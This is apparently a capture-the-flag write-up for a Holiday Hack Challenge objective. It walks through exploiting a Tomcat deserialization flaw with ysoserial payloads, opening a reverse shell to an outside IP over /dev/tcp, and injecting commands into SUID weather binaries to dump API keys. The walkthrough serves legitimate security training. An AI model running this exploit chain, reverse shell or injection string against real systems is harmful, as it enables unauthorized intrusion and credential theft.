|[Previous Objective](HHC_2025_Template/HackaGnome.html)  |   [Table of Contents](HHC_2025_Template/index.html) | [Next Objective](HHC_2025_Template/SchrödingersScope.html)
| :----------------------- | :--------------------------------: | --------------------------------: |

| Snowcat RCE and Privilege Escalation    | Difficulty Level: 3 |
| :-----------------------: | :--------------------------: |
| Tom, in the hotel, found a wild Snowcat bug. Help him chase down the RCE! Recover and submit the API key not being used by snowcat. | Grand Hotel  |

## Objective Overview

Using an account with minimal access to the system, the website was found to be running Apache Tomcat version 9.0.90. This version is susceptable to a remote code execution vulnerability. This vulnerability was exploited to gain the privileges of the web application service account. Three binaries were discovered with SUID (Set User ID), a special permission in Unix/Linux systems that allows a file to run with the privileges of the file owner rather than the user executing it. These files were suscept to command injection, allowing commands to be executed as a user with higher privileges. This enabled access to the authorized_keys file.

| Method Used             | MITRE ATT&CK Framework Method |
| :-----------------------: | :--------------------------------: |
| Leverage Unauthenticated Remote Code Execution (RCE) in Apache Tomcat (CVE-2025-24815) | Initial Access: T1190 |
| Abuse SUID privilege | Abuse Elevation Control Mechanism: Setuid and Setgid: T1548.001 |
| Command Injection leading to Privilege Escalation   | Command and Scripting Interpreter : T1059|


## Detailed Solution
<details>
<summary>Click to expand</summary>
Using a nonexistent URL, an error message was triggered revealing that the system is vulnerable.
  
[Non Existant URL](https://localhostnonexistant)
  
![Tomcat Version Evidence](/images/snowcat_version.jpg) 

Testing began with the CommonsCollections6 gadget to determine if a payload could effectively be delivered. The initial approach is to simply touch a file in the /tmp directory.
Payload details:
```sh
java -jar /home/user/ysoserial.jar CommonsCollections6 'touch /tmp/pwned' > payload.bin
SESSION_ID=$(curl -s -c - http://localhost/ | grep JSESSIONID | awk '{print $7}')
curl -s -X PUT -H "Content-Length: $(wc -c < payload.bin)" -H "Content-Range: bytes 0-$(($(wc -c < payload.bin)-1))/$(wc -c < payload.bin)" --data-binary @payload.bin "http://localhost/${SESSION_ID}/session" > /dev/null
curl -s -H "Cookie: JSESSIONID=.${SESSION_ID}" "http://localhost/" > /dev/null
ls -la /tmp/pwned 2>/dev/null && echo "SUCCESS with touch!" || echo "Failed"
```
The initial payload was delivered and successful:

![Tomcat Initial Payload Evidence](/images/snowcat_initialpayload.jpg) 

To achieve a remote shell, the following approach was used:
1. Setup a linux machine in linode, and start a netcat listener on port 4444
2. As the low level user, creat a shell file in the /tmp directory
3. Change permissions on the file to allow other users to access and execute
4. Send a payload to set the SUID on the shell file
5. Send a payload that uses setsid to detach the process completely and run the shell

The shell file used was:
```sh
bash -i >& /dev/tcp/69.164.211.205/4444 0>&1
```

The payload used to set the SUID was:
```sh
java -jar /home/user/ysoserial.jar CommonsCollections6 'chmod u+s /tmp/reverse_shell.sh' > payload.bin
<!-- Get session ID -->
SESSION_ID=$(curl -s -c - http://localhost/ | grep JSESSIONID | awk '{print $7}')
<!-- Upload payload -->
curl -s -X PUT -H "Content-Length: $(wc -c < payload.bin)" -H "Content-Range: bytes 0-$(($(wc -c < payload.bin)-1))/$(wc -c < payload.bin)" --data-binary @payload.bin "http://localhost/${SESSION_ID}/session" > /dev/null
<!-- Trigger payload -->
curl -s -H "Cookie: JSESSIONID=.${SESSION_ID}" "http://localhost/" > /dev/null
```

The payload used setid and ran the shell was:
```sh
java -jar /home/user/ysoserial.jar CommonsCollections6 'setsid bash /tmp/reverse_shell.sh >/dev/null 2>&1 &' > payload.bin
<!-- Get session ID -->
SESSION_ID=$(curl -s -c - http://localhost/ | grep JSESSIONID | awk '{print $7}')
<!-- Upload payload -->
curl -s -X PUT -H "Content-Length: $(wc -c < payload.bin)" -H "Content-Range: bytes 0-$(($(wc -c < payload.bin)-1))/$(wc -c < payload.bin)" --data-binary @payload.bin "http://localhost/${SESSION_ID}/session" > /dev/null
<!-- Trigger payload -->
curl -s -H "Cookie: JSESSIONID=.${SESSION_ID}" "http://localhost/" > /dev/null
```

This resulted in access as the identity running the web service:

![Snowcat Service Account User](/images/snowcat_serviceaccount.jpg) 

Three binaries were discovered that the service account has access to with the SUID set:
These binaries have SUID set:
/usr/local/weather/humidity
/usr/local/weather/pressure
/usr/local/weather/temperature

The commands are run with a valid key:
/usr/local/weather/temperature 4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6
/usr/local/weather/humidity 4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6
/usr/local/weather/pressure 4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6

The weather user has access to the /usr/local/weather/keys directory. This was our target:
![Keys Directory](/images/snowcat_keys.jpg)  

The following command was injected into the binary command line to create a file containing the contents of the keys folder and change the file permissions:
```
/usr/local/weather/temperature "4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6';cat /usr/local/weather/keys/* > /tmp/keys.txt;chmod 644 /tmp/keys.txt;echo '"
```

Viewing the contents of the file revealed:
```
cat /tmp/keys.txt
4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6
8ade723d-9968-45c9-9c33-7606c49c2201
```
**Answer: 8ade723d-9968-45c9-9c33-7606c49c2201**

</details>

## References

| Tools Used           | Tool Version |
| :-----------------------: | :--------------------------------: |
| ysoserial | Version: v0.0.6 Release Date: June 28, 2022 | 
| Linux Linode System | Ubuntu 24.04 LTS |
| netcat | v1.10-50 | 

## Hints
| Provided By         | Hint |
| :-----------------------: | :--------------------------------: |
| Santa | Snowcat is closely related to Tomcat. Maybe the recent Tomcat Remote Code Execution vulnerability (CVE-2025-24813) will work here. |
| Santa | Maybe we can inject commands into the calls to the temperature, humidity, and pressure monitoring services. |
| Santa | If you're feeling adventurous, maybe you can become root to figure out more about the attacker's plans. |
| Thomas Hessman | We've lost access to the neighborhood weather monitoring station. There are a couple of vulnerabilities in the snowcat and weather monitoring services that we haven't gotten around to fixing. Can you help me exploit the vulnerabilities and retrieve the other application's authorization key? Enter the other application's authorization key into the badge. If Frosty's plan works and everything freezes over, our customers won't be having the best possible experience—they'll be having the coldest possible experience! We need to stop this before the whole neighborhood becomes one giant freezer.|

|[Previous Objective](https://mitchdarrow.github.io/HHC_2025_Template/HackaGnome.html)  |   [Table of Contents](https://mitchdarrow.github.io/HHC_2025_Template/index.html) | [Next Objective](https://mitchdarrow.github.io/HHC_2025_Template/SchrödingersScope.html)
| :----------------------- | :--------------------------------: | --------------------------------: |
